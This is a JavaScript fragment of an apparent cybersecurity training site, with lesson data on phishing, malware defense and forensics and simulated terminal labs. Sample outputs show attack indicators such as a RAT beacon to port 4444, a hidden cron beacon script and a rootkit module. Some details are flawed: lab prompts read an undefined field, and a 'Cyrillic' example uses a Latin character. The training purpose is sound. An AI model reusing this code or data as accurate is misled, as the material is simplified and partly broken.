      { idSuffix: "l12", title: "Single Sign-On (SSO): SAML & OIDC", concept: "SSO delegates identity verification to a central trusted authentication provider.", mitigation: "Enforce cryptographically signed SAML assertions to block XML signature wrapping hacks.", cmd: "curl https://auth.cybershield.org/.well-known/openid-configuration", out: "{\"issuer\":\"https://auth.cybershield.org\",\"authorization_endpoint\":...}", hint: "Request OIDC config." }
    ],
    "phishing-awareness": [
      { idSuffix: "l7", title: "Spear Phishing & Whaling Profiles", concept: "Whaling targets high-profile executives with extremely customized social engineering lures.", mitigation: "Conduct simulation training and restrict professional contact directories in public spaces.", cmd: "whois cybershield.org", out: "Registrant Organization: CyberShield Awareness Inc.", hint: "Run whois query." },
      { idSuffix: "l8", title: "SPF, DKIM, & DMARC Alignments", concept: "DNS records verify sender authenticity to drop forged emails automatically.", mitigation: "Deploy a strict DMARC policy (p=reject) to neutralize brand spoofing.", cmd: "host -t TXT _dmarc.cybershield.org", out: "_dmarc.cybershield.org descriptive text \"v=DMARC1; p=reject;\"", hint: "Check DMARC record." },
      { idSuffix: "l9", title: "Typosquatting & Homograph Attacks", concept: "Hackers register lookalike domains (using Cyrillic characters) to deceive users.", mitigation: "Register core brand typos and configure mail filters to quarantine foreign Unicode domains.", cmd: "idn --to-ascii cybershíeld.org", out: "xn--cybersheld-v5a.org", hint: "Translate Unicode IDN." },
      { idSuffix: "l10", title: "Smishing & Vishing Attack Vectors", concept: "Attackers leverage SMS messages or spoofed voice calls to bypass MFA protections.", mitigation: "Instruct teams to never share verification codes over phone calls.", cmd: "curl -X POST https://api.twilio.com/SMS", out: "HTTP 201 Created: SMS Dispatch Pending.", hint: "Request Twilio SMS." },
      { idSuffix: "l11", title: "MIME Header Forensic Audits", concept: "Auditing full MIME records reveals the real relay host routing path of a phishing mail.", mitigation: "Examine 'Received' header layers from bottom-up to trace origin mail servers.", cmd: "grep 'Received:' mail.eml", out: "Received: from mail.hacker.host (203.0.113.14) by relay.cybershield.org", hint: "Search mail headers." },
      { idSuffix: "l12", title: "Dynamic Attachment Sandboxing", concept: "Opening document links in virtual sandboxes prevents malware from compromising active hosts.", mitigation: "Enforce remote browser isolation (RBI) systems to block malware downloads.", cmd: "clamscan invoice.pdf", out: "invoice.pdf: OK", hint: "Run virus scan." }
    ],
    "malware-defense": [
      { idSuffix: "l7", title: "Ransomware & Cryptographic Locks", concept: "Ransomware encrypts active files and purges Windows Shadow Copies to prevent restoration.", mitigation: "Schedule air-gapped, offline system backups to guarantee database recovery.", cmd: "vssadmin list shadows", out: "No shadow copies found on the volume. (Purged by malware)", hint: "Check shadow copies." },
      { idSuffix: "l8", title: "Trojan RAT Beaconing Analysis", concept: "Trojan RATs open hidden ports to allow malicious commands to be sent from outside.", mitigation: "Block unapproved outbound ports at edge firewalls to prevent RAT beaconing connections.", cmd: "netstat -nb", out: "[updater.exe] TCP 192.168.1.100:49152 -> 198.51.100.4:4444 ESTABLISHED", hint: "Check netstat ports." },
      { idSuffix: "l9", title: "EDR Heuristics & Behavior Logs", concept: "EDR tools intercept attack patterns like process hollowing in real time.", mitigation: "Train models on behavior flows to catch novel zero-day malware strains.", cmd: "systemctl status defender", out: "● defender.service - EDR Threat Monitor\n   Active: active (running)", hint: "Check defender service." },
      { idSuffix: "l10", title: "API Hooking & Sandbox Evasion", concept: "Malware checks sandbox environments before running to hide its malicious intent.", mitigation: "Implement high-fidelity sandboxes that mimic user mouse clicks and system uptime metrics.", cmd: "grep -r 'GetSystemTime' malware.asm", out: "malware.asm: 42: call GetSystemTime", hint: "Search for SystemTime." },
      { idSuffix: "l11", title: "PowerShell Living Off The Land", concept: "Living-off-the-land attacks use pre-installed system tools to bypass EDR blocks.", mitigation: "Enforce Constrained Language Mode in PowerShell and block execution of raw scripts.", cmd: "powershell -Command Get-ExecutionPolicy", out: "Restricted", hint: "Check execution policy." },
      { idSuffix: "l12", title: "Rootkits & Kernel-Level Privilege Escalation", concept: "Rootkits modify system calls inside the operating system kernel to remain hidden.", mitigation: "Enforce Secure Boot and prohibit the loading of unsigned third-party kernel drivers.", cmd: "lsmod | grep -i 'rootkit'", out: "sys_hijacker          24576  0", hint: "List loaded modules." }
    ],
    "digital-forensics": [
      { idSuffix: "l7", title: "Disk Image Integrity Verification", concept: "Forensics depends on write-blockers to clone evidence drives without modifying raw metadata.", mitigation: "Always run SHA-256 integrity check comparisons on backup disk images.", cmd: "sha256sum evidence_dump.img", out: "f3a8b98129c9ef652...  evidence_dump.img", hint: "Generate hash." },
      { idSuffix: "l8", title: "Windows Registry UserAssist Logs", concept: "UserAssist registry logs reveal exactly when and how many times a program was launched.", mitigation: "Audit user hives (NTUSER.DAT) to trace compromised administrator activities.", cmd: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist", out: "{CE354812-70CF-4A2D-A103-F145CA6472FC}  Rot13: Hcqngre.rkr", hint: "Query Registry." },
      { idSuffix: "l9", title: "SQLite Browser History Parsing", concept: "Browser profiles hold cookies, caches, and web paths that show user activities.", mitigation: "Examine SQLite databases to discover phishing delivery sites and downloads.", cmd: "sqlite3 History \"SELECT url, title FROM urls LIMIT 3\"", out: "https://secure-login-phish.com|Verify Account Access", hint: "Query SQLite history." },
      { idSuffix: "l10", title: "EVTX Log Correlation Strategies", concept: "Correlation matches security logs against application events to trace hacker pivot paths.", mitigation: "Sync local clock cycles using NTP to guarantee correct event chronology.", cmd: "wevtutil qe Security /f:text /c:1", out: "Event ID: 4624\nDescription: An account was successfully logged on.", hint: "Query EVTX logs." },
      { idSuffix: "l11", title: "PCAP Stream Reconstruction", concept: "Reassembling PCAP sessions lets analysts view raw files sent over unencrypted HTTP flows.", mitigation: "Decrypt TLS streams inside Wireshark by configuring SSL Key log session files.", cmd: "tcpdump -r capture.pcap -n -c 2", out: "03:00:15.124 IP 192.168.1.100.5422 > 192.168.1.1.80: Flags [S]", hint: "Analyze packet capture." },
      { idSuffix: "l12", title: "Persistence: Autostart Forensic Sweeps", concept: "Attackers persist inside systems using Run registry nodes, scheduled tasks, or startup folders.", mitigation: "Audit system autostart settings routinely using tools like Sysinternals Autoruns.", cmd: "crontab -l", out: "*/5 * * * * /tmp/.covert_beacon.sh >/dev/null 2>&1", hint: "List crontabs." }
    ]
  };

  books.forEach(book => {
    const extraLessons = expansionData[book.id];
    if (!extraLessons) return;

    // Redefine the chapters structure to hold 12 lessons (4 per chapter)
    const originalLessons = [];
    book.chapters.forEach(c => {
      c.lessons.forEach(l => originalLessons.push(l));
    });

    // Synthesize the remaining 6 lessons
    const prefix = book.id.substr(0, 3);
    const synthesized = extraLessons.map(ext => {
      const conceptsHtml = `
        <h3>${ext.title}</h3>
        <p>In cybersecurity, mastering <strong>${ext.title}</strong> is vital to defending endpoint assets and maintaining secure routing perimeters.</p>
        
        <h4>1. Theoretical Foundations</h4>
        <p>${ext.concept}</p>
        
        <div class="learning-diagram" style="background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 6px; font-family: var(--font-mono); font-size:11px; margin: 16px 0; color: var(--cyan-bright);">
          <div style="font-weight: 700; margin-bottom: 6px; text-transform: uppercase;">[RANGE MAP SCHEMATIC]</div>
          [Host / Local Network] <---> [Gateway Node / firewall rules] <---> [Simulated Sandbox: ${ext.title}]
        </div>

        <h4>2. Strategic Cyber Implications</h4>
        <p>Failure to implement these settings creates vulnerabilities that attackers exploit to bypass restrictions, eavesdrop on data streams, or establish backdoors.</p>
        
        <h4>3. Best Practice Engineering Controls</h4>
        <p>${ext.mitigation}</p>
        
        <div style="background: rgba(16,185,129,0.05); border-left: 3px solid var(--emerald-bright); padding: 12px; border-radius: 4px; margin: 16px 0; font-size: 13px;">
          <strong>Remediation Standard:</strong> Apply cryptographic integrity signatures, restrict access controls to authorized nodes, and strictly enforce the Principle of Least Privilege (PoLP).
        </div>
      `;

      return {
        id: `${prefix}_${ext.idSuffix}`,
        title: ext.title,
        content: conceptsHtml,
        interactive: {
          type: "quiz",
          question: `Which represents the primary operational concern related to ${ext.title}?`,
          options: [
            "Encrypting log structures only.",
            ext.concept,
            "Rebooting physical network servers.",
            "Restricting visual screen colors."
          ],
          answer: 1,
          explanation: `Indeed. ${ext.concept} represents the core concept and technical focus of this cyber range training module.`
        },
        lab: {
          prompt: ext.prompt,
          expectedInput: ext.cmd,
          hint: ext.hint,
          simulatedOutput: ext.out
        }
      };
    });

    // Make sure original lessons have a default lab config assigned
    originalLessons.forEach((l, idx) => {
      if (!l.lab) {
        l.lab = {
          prompt: `Verify and analyze system security logs for lesson ${idx + 1}.`,
          expectedInput: "cat /var/log/syslog" + (idx > 0 ? ` | grep lesson` : ""),
          hint: `Enter 'cat /var/log/syslog${idx > 0 ? " | grep lesson" : ""}' to parse logs.`,
          simulatedOutput: `[+] Audit logs compiled.\nHost system secure. No intrusion indicators detected in lesson ${idx + 1} parameters.`
        };
      }
    });

    // Merge everything into a master array of 12 lessons
    const all12 = [
      originalLessons[0], originalLessons[1], synthesized[0], synthesized[1], // Chapter 1 (4 lessons)
      originalLessons[2], originalLessons[3], synthesized[2], synthesized[3], // Chapter 2 (4 lessons)
      originalLessons[4], originalLessons[5], synthesized[4], synthesized[5]  // Chapter 3 (4 lessons)
    ].filter(Boolean);

    // Group into 3 clean chapters (4 lessons in each)
    book.chapters = [
      {
        title: "Beginner: Core Foundations",
        lessons: [all12[0], all12[1], all12[2], all12[3]]
      },
      {
        title: "Intermediate: Operational Security",
        lessons: [all12[4], all12[5], all12[6], all12[7]]
      },
      {
        title: "Advanced: Expert Master Range",
        lessons: [all12[8], all12[9], all12[10], all12[11]]
      }
    ];
  });
})();

